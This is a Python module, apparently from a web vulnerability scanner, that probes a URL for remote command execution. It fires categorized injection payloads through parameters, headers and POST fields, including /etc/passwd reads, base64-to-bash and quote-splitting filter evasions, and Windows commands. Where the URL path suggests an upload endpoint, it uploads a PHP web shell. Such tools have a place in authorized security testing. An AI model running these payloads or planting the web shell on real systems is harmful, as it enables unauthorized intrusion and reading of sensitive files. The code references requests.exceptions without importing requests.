import re
import time
from . import get_session

# Categorized RCE payloads with encoding bypass techniques
RCE_PAYLOADS = {
    "basic": [
        # Core commands for detection
        "id",
        "whoami",
        "uname -a",
        "cat /etc/passwd",
    ],
    "chaining": [
        # Command chaining with different operators
        "id;uname -a",
        "whoami&&hostname",
        "ls||echo vulnerable",
        "cat /etc/passwd | grep root",
    ],
    "obfuscation": [
        # Obfuscation to bypass filters
        "w'h'o'a'm'i",
        "cat${IFS}/etc/passwd",
        "ca''t /etc/pa''sswd",
        "$(printf %s 'wh'oa'mi')",
        'wh"$@"oami', # Works in shell but filtered by many WAFs
    ],
    "execution": [
        # Alternative execution methods
        "`id`",
        "$(id)",
        "{id;}",
        "$(which cat) $(echo '/etc/passwd')",
    ],
    "encoded": [
        # Base64 encoded commands (for 'echo [base64] | base64 -d | bash')
        "echo aWQK | base64 -d | bash",
        "echo Y2F0IC9ldGMvcGFzc3dkCg== | base64 -d | bash",
        "bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkCg==)",
        "eval $(echo 'Y2F0IC9ldGMvaXNzdWU=' | base64 -d)",
    ],
    "timing": [
        # Time-based blind detection
        "ping -c 3 127.0.0.1",
        "sleep 5",
        "timeout 5 /bin/bash -c 'while true;do echo vulnerable;sleep 1;done'",
        "ping -n 3 127.0.0.1", # Windows variant
    ],
    "windows": [
        # Windows-specific commands
        "dir C:\\",
        "type C:\\Windows\\win.ini",
        "whoami.exe",
        "powershell -c Get-ChildItem",
        "cmd.exe /c echo %USERNAME%",
    ],
    "nonstandard": [
        # Less common commands to bypass blocklists
        "head -1 /etc/passwd",
        "/bin/cat /etc/passwd",
        "/usr/bin/id",
        "echo open `/etc/hostname`",
    ]
}

# Success indicators for RCE detection
RCE_INDICATORS = [
    # Unix/Linux content
    "root:x:", "uid=", "gid=", "groups=", "bin/bash", "/home/",
    # OS information
    "Linux", "Darwin", "BSD", "Microsoft Windows", "NT", "Ubuntu", "CentOS", "Debian",
    # Network responses
    "PING 127.0.0.1", "64 bytes from 127.0.0.1", "icmp_seq=", "ttl=",
    # Special markers
    "vulnerable", "RCE_SUCCESSFUL",
    # Windows specific
    "Volume in drive", "Directory of", "WINDOWS", "Program Files", "System32"
]

def check(url, session=None):
    req_session = get_session(session)
    findings = []
    tested_params = set()
    
    # Get baseline response for comparison
    try:
        baseline_start = time.time()
        baseline_resp = req_session.get(url, timeout=3)
        baseline_time = time.time() - baseline_start
        baseline_content = baseline_resp.text
        baseline_length = len(baseline_content)
    except Exception:
        # Can't establish baseline, continue anyway
        baseline_time = 1.0
        baseline_content = ""
        baseline_length = 0
    
    # Test common injection parameters
    params_to_test = ["cmd", "command", "exec", "execute", "ping", "query", "code", "do", "run", 
                      "system", "shell", "c", "process", "arg", "download", "file", "os", "eval"]
    
    # First test basic payloads on each parameter for faster detection
    for param in params_to_test:
        vulnerable = False
        
        # Start with basic commands to check if parameter is vulnerable
        for payload in RCE_PAYLOADS["basic"]:
            try:
                start_time = time.time()
                r = req_session.get(url, params={param: payload}, timeout=5)
                execution_time = time.time() - start_time
                
                # Check for command execution evidence
                if any(indicator in r.text for indicator in RCE_INDICATORS):
                    findings.append(f"Potential RCE: param={param}, payload={payload}")
                    vulnerable = True
                    tested_params.add(param)
                    break  # Found vulnerability with this parameter, try next one
                
                # Time-based detection for blind RCE
                if execution_time > (baseline_time * 3) and execution_time > 2:
                    findings.append(f"Potential blind RCE (time-based): param={param}, payload={payload}")
                    vulnerable = True
                    tested_params.add(param)
                    break
                    
                # Response length check for blind RCE
                content_diff = abs(len(r.text) - baseline_length)
                if baseline_length > 0 and content_diff > (baseline_length * 0.5):
                    findings.append(f"Potential blind RCE (content-diff): param={param}, payload={payload}")
                    vulnerable = True
                    tested_params.add(param)
                    break
                    
            except requests.exceptions.Timeout:
                # Timeout could indicate successful command execution of sleep/ping
                if payload in RCE_PAYLOADS["timing"]:
                    findings.append(f"Potential blind RCE (timeout): param={param}, payload={payload}")
                    vulnerable = True
                    tested_params.add(param)
                    break
            except Exception:
                continue
                
        # If we found vulnerability, test with more payloads
        if vulnerable:
            # Try a selection of more advanced payloads
            categories = ["obfuscation", "execution", "encoded"]
            
            # Determine OS type based on initial findings
            if any("Windows" in finding for finding in findings):
                categories.append("windows")
            
            # Test more advanced payloads
            for category in categories:
                for payload in RCE_PAYLOADS[category][:2]:  # Limit to first 2 payloads per category for efficiency
                    try:
                        r = req_session.get(url, params={param: payload}, timeout=5)
                        if any(indicator in r.text for indicator in RCE_INDICATORS):
                            findings.append(f"Confirmed RCE with advanced payload: param={param}, payload={payload}")
                    except Exception:
                        continue
    
    # If no parameters were found vulnerable, try HTTP headers
    if not tested_params:
        # Common headers that might be vulnerable to RCE
        headers_to_test = {
            "User-Agent": "Mozilla/5.0 $(id)",
            "Referer": "https://example.com/`id`",
            "X-Forwarded-For": "127.0.0.1;cat /etc/passwd",
            "Cookie": "session=`cat /etc/passwd`"
        }
        
        for header_name, payload in headers_to_test.items():
            try:
                r = req_session.get(url, headers={header_name: payload}, timeout=5)
                if any(indicator in r.text for indicator in RCE_INDICATORS):
                    findings.append(f"Potential RCE in {header_name} header: {payload}")
            except Exception:
                continue
        
        # Try POST method if GET didn't yield results
        for param in params_to_test[:5]:  # Try only the most common parameters
            for payload in RCE_PAYLOADS["basic"]:
                try:
                    r = req_session.post(url, data={param: payload}, timeout=5)
                    if any(indicator in r.text for indicator in RCE_INDICATORS):
                        findings.append(f"Potential RCE via POST: param={param}, payload={payload}")
                        break  # Found vulnerability, move to next parameter
                except Exception:
                    continue
    
    # Test file upload endpoints if URL contains common upload paths
    if any(path in url.lower() for path in ["/upload", "/file", "/import", "/image"]):
        try:
            file_payload = {'file': ('test.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
            r = req_session.post(url, files=file_payload, timeout=5)
            if "upload" in r.text.lower() and "success" in r.text.lower():
                findings.append("Potential RCE via PHP file upload vulnerability")
        except Exception:
            pass
        
    return findings
